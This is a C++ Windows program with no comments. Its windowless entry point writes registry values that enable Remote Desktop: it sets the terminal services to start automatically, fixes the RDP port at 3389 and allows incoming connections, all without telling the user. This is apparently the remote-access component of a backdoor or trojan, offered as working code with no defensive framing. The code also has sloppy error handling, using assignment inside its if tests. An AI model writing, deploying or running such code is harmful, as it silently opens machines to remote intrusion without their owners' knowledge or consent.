#include <iostream>
#include <windows.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>

using namespace std;

class OpenTerminal {
public:
	BOOL SetStringValue(HKEY Hroot, const char* SzSubKey, const char* SzValueName, const char* SzValue);

	BOOL SetDwordValue(HKEY Hroot, const char* SzSubKey, const char* SzValueName, DWORD SzValue);
};

BOOL OpenTerminal::SetStringValue(HKEY hRoot, const char* szSubKey, const char* szValueName, const char* szValue)
{
	HKEY key = NULL;
	long let;
	let = RegCreateKeyEx(hRoot, szSubKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
	if (let = RegSetValueEx(key, szValueName, 0, REG_SZ, (BYTE*)szValue, strlen(szValue))) return false;
	RegCloseKey(key);
	return true;
}

BOOL OpenTerminal::SetDwordValue(HKEY hRoot, const char* szSubKey, const char* szValueName, DWORD szValue)
{
	HKEY key = NULL;
	long let;
	let = RegCreateKeyEx(hRoot, szSubKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL);
	if (let = RegSetValueEx(key, szValueName, 0, REG_DWORD, (BYTE*)&szValue, sizeof(DWORD))) return false;
	RegCloseKey(key);
	return true;
}

int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd) {
	OpenTerminal TerOpen;
	TerOpen.SetStringValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\netcache", "Enabled", "0");
	TerOpen.SetDwordValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer", "EnableAdminTSRemote", 0x00000001);
	TerOpen.SetStringValue(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", "ShutdownWithoutLogon", "0");
	TerOpen.SetDwordValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server", "TSEnabled", 0x00000001);
	TerOpen.SetDwordValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\TermDD", "Start", 0x00000002);
	TerOpen.SetDwordValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Services\\TermService", "Start", 0x00000002);
	TerOpen.SetDwordValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server", "fDenyTSConnections", 0x00000001);
	TerOpen.SetDwordValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\RDPTcp", "PortNumber", 0x00000d3d);
	TerOpen.SetDwordValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp", "PortNumber", 0x00000d3d);
	TerOpen.SetDwordValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp", "PortNumber", 0x00000d3d);
	TerOpen.SetDwordValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Terminal Server", "fDenyTSConnections", 0x00000000);
	TerOpen.SetStringValue(HKEY_USERS, ".DEFAULT\\Keyboard Layout\\Toggle", "Hotkey", "2");
	return 0;
}
